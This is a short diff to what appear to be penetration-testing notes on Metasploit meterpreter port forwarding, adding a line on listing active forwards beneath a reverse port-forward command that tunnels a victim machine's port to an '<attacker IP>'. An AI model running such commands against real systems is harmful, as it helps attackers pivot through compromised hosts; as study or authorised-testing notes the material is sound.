@@ -7,3 +7,5 @@ Portforward commands with metasploit:
 
 meterpreter> portfwd add -R -p 1234 -l 443 -L <attacker IP>: this will open a port 1234 on victim machine which will forward the traffic to 443  of attacker machine
 
+meterpreter> portfwd: This will help in listing the active port forwards
+
